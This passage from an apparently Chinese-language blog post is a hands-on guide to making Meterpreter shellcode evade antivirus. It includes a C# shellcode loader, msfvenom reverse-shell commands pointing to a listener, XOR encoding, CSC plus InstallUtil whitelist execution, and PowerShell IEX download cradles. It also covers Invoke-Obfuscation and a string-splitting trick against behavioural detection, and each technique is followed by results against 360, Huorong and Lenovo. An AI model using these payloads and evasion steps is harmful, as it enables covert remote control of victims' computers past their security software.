            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
            [DllImport("kernel32")]
                    private static extern bool VirtualFree(IntPtr lpAddress,
            UInt32 dwSize, UInt32 dwFreeType);
            [DllImport("kernel32")]
                    private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
            );
            [DllImport("kernel32")]
                    private static extern bool CloseHandle(IntPtr handle);
            [DllImport("kernel32")]
                    private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );
            [DllImport("kernel32")]
                    private static extern IntPtr GetModuleHandle(
            string moduleName
            );
            [DllImport("kernel32")]
                    private static extern UInt32 GetProcAddress(
            IntPtr hModule,
            string procName
            );
            [DllImport("kernel32")]
                    private static extern UInt32 LoadLibrary(
            string lpFileName
            );
            [DllImport("kernel32")]
                    private static extern UInt32 GetLastError();
      }
}
```
编译运行，发现360和联想电脑管家静态查杀，动态未被拦截，火绒静动态均可查杀
![](/bmth_blog/images/pasted-268.png)
#### XOR/AES编码shellcode
需要使用一个工具[https://github.com/Arno0x/ShellcodeWrapper](https://github.com/Arno0x/ShellcodeWrapper)，之前下过的
先用msfvenom生成一个raw格式的shellcode
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=192.168.50.209 lport=6666 -f raw > shellcode.raw
```
在`ShellcodeWrapper`文件夹中执行下面命令，其中`bmth`为自己设置的key。
```bash
python shellcode_encoder.py -cpp -cs -py shellcode.raw bmth xor
```
![](/bmth_blog/images/pasted-269.png)
最后新建C#项目,编译运行.cs文件，最后发现和上面的查杀效果一样的，火绒查杀

#### 使用CSC+InstallUtil执行shellcode
>加载器用的比较多的是CSC.exe+InstallUtil.exe加载shellcode，流程为：msf生成C#格式shellcode -> 加密shellcode -> 解密并加载shellcode -> csc.exe编译成.jpg文件 -> InstallUtil.exe白名单执行。

先通过msfvenom生成C＃的shellcode
`msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' lhost=192.168.50.209 lport=6666 -f csharp`
![](/bmth_blog/images/pasted-270.png)
下载InstallUtil-Shellcode.cs，并将shellcode复制进去
```bash
wget https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/InstallUtil-Shellcode.cs
```
使用csc编译InstallUtil-ShellCode.cs
```cmd
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:C:\Users\bmth\Desktop\miansha\shell.exe C:\Users\bmth\Desktop\miansha\InstallUtil-ShellCode.cs
```
编译生成的shell.exe直接执行是不行的，需要使用InstallUtil.exe来触发shell.exe
```cmd
C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\bmth\Desktop\miansha\shell.exe
```
![](/bmth_blog/images/pasted-271.png)
最后发现静态都会被查杀，动态火绒和360会预警，联想电脑管家动态可过


参考文章：
[那些shellcode免杀总结](https://xz.aliyun.com/t/7170)
[记一则免杀技巧](https://www.jianshu.com/p/965211afc5f9)
[那些shellcode免杀总结](https://xz.aliyun.com/t/7170)
[《使用C＃编写自定义后门负载》学习笔记及免杀尝试](https://xz.aliyun.com/t/6222)

### powershell加载shellcode免杀
>UNIX系统一直有着功能强大的壳程序（shell），Windows PowerShell的诞生就是要提供功能相当于UNIX系统的命令行壳程序（例如：sh、bash或csh），同时也内置脚本语言以及辅助脚本程序的工具，使命令行用户和脚本编写者可以利用 .NET Framework的强大功能。
powershell具有在硬盘中易绕过，内存中难查杀的特点。一般在后渗透中，攻击者可以在计算机上执行代码时，会下载powershell脚本来执行，ps1脚本文件无需写入到硬盘中，直接可以在内存中执行。
常见的powershell攻击工具有powersploit、nishang、empire、powercat，都提供了非常牛掰的攻击脚本，也正因为powershell的强大，现在被杀软都盯的非常紧了。我们这里只是介绍powershell加载shellcode的几种简单方式，是powershell众多功能中的很小的一个方面。
Powershell加载shellcode方法比较灵活，shellcode一般都不会被查杀，而如何对Powershell脚本进行静态和行为免杀，就成了免杀的一个关键了。

```
Invoke-Expression（IEX的别名）：用来把字符串当作命令执行。
WindowStyle Hidden（-w Hidden）：隐藏窗口
Nonlnteractive（-NonI）：非交互模式，PowerShell不为用户提供交互的提示。
NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件。
Noexit（-Noe）：执行后不退出Shell。
EncodedCommand（-enc）: 接受base64 encode的字符串编码，避免一些解析问题
```

#### msf-ps1本地执行(过360,联想电脑管家)
用msfvenom生成powershell马，注意这里是`-f psh`
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 15 -b '\x00' lhost=192.168.50.209 lport=6666 -f psh -o shell.ps1
```
主要这里要用x64架构的payload，不然的话64位的windows会默认调用64的powershell，执行会出错
将shell.ps1拷贝到测试机器上，本地执行
```cmd
powershell.exe -ExecutionPolicy Bypass -NoExit -File shell.ps1
```
测试发现可过360和联想电脑管家，火绒动静态均可查杀
![](/bmth_blog/images/pasted-272.png)

#### Invoke-Shellcode加载(过360)
Invoke-Shellcode是PowerSploit里的一个脚本工具：[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1)，通过它可以加载自定义的shellcode，而且还支持在powershell中反弹msf，支持http和https协议
PowerSploit里面还有`Invoke-DllInjection.ps1`可以加载dll文件，`Invoke-ReflectivePEInjection.ps1`可以加载exe文件，[Powershell tricksCode Execution & Process Injection](https://cn-sec.com/archives/64079.html)
先用msfvenom生成脚本木马
```bash
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.50.209 LPORT=6666 -f powershell -o shell.ps1
```
![](/bmth_blog/images/pasted-273.png)
开启python服务器，`python -m SimpleHTTPServer 8000`
在测试机器powershell中分别执行下面命令。
```cmd
IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1")
IEX(New-Object Net.WebClient).DownloadString("http://192.168.50.209:8000/shell.ps1")
Invoke-Shellcode -Shellcode ($buf) -Force
```
发现火绒静态可查杀，动态杀不掉，360和联想电脑管家无反应
![](/bmth_blog/images/pasted-274.png)
#### Invoke-Obfuscation对ps1免杀(过360)
>powershell的免杀方法有很多，对代码进行编码是最常见的一种，这里介绍一个专门用来对powershell进行编码免杀的框架Invoke-Obfuscation，这也是著名的APT32组织海莲花常用的一个工具。

Invoke-Obfuscation主要是对ps1脚本进行免杀，用msfvenom生成powershell马
`msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 15 -b '\x00' lhost=192.168.50.209 lport=6666 -f psh -o shell.ps1`
进入Invoke-Obfuscation目录，在powershell中执行`Import-Module .\Invoke-Obfuscation.psd1; Invoke-Obfuscation`
![](/bmth_blog/images/pasted-275.png)
然后执行`set scriptpath C:\Users\bmth\Desktop\miansha\shell.ps1` 指定待处理的Ps1文件，或者`set scriptblock 'echo xss'`指定待处理的ps代码
![](/bmth_blog/images/pasted-276.png)
然后输入encoding，再选择编码方式，比如1，最后执行`out C:\Users\bmth\Desktop\miansha\jiami.ps1`即可输出处理好的ps1文件
本地执行：`powershell.exe -ExecutionPolicy Bypass -NoExit -File C:\Users\bmth\Desktop\miansha\jiami.ps1`
![](/bmth_blog/images/pasted-277.png)
火绒静态免杀，动态查杀，360和联想电脑管家无反应


#### ps1行为免杀(过360,联想电脑管家)
虽然ps1代码自身免杀，但在用powershell执行远程下载或执行shellcode时，很容易触发杀软行为规则
利用replace替换函数，可以bypass。
```cmd
powershell -NoExit "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://192.168.50.209:8000/shell.ps1'')'.Replace('123','adString');IEX ($c1+$c2)"
```
![](/bmth_blog/images/pasted-278.png)
发现火绒还是发现了msf的特征，但还是能连接，360和联想电脑管家没反应

>powershell的功能强悍，各种姿势免杀方式也很多，我这里只是介绍了一点简单的加载shellcode的方式，以及一种静态免杀和一种行为免杀的方式，更多免杀可以结合一些知名成熟的工具自己手工去实现。

参考文章：
[Powershell编码与混淆](https://www.freebuf.com/sectool/136328.html)
[Invoke-Obfuscation混淆ps文件绕过Windows_Defender ](https://www.cnblogs.com/sstfy/p/10440301.html)
[攻防演练对抗赛之初识文件钓鱼 ](https://mp.weixin.qq.com/s/lhg71lVHfp9PY1m8sYXA_A)

### 



## b站视频学习
收藏了几个up主做的免杀视频，这里学习学习(貌似只有这一位师傅)
### 【学习分享】分离免杀shellcode
[https://www.bilibili.com/video/BV1jr4y1c7gJ](https://www.bilibili.com/video/BV1jr4y1c7gJ)



### 【学习分享】themida加壳免杀火绒
[https://www.bilibili.com/video/BV1fy4y1z7WL](https://www.bilibili.com/video/BV1fy4y1z7WL)


### 【学习分享】异或加密shellcode再dll免杀火绒
[https://www.bilibili.com/video/BV1G541157j8](https://www.bilibili.com/video/BV1G541157j8)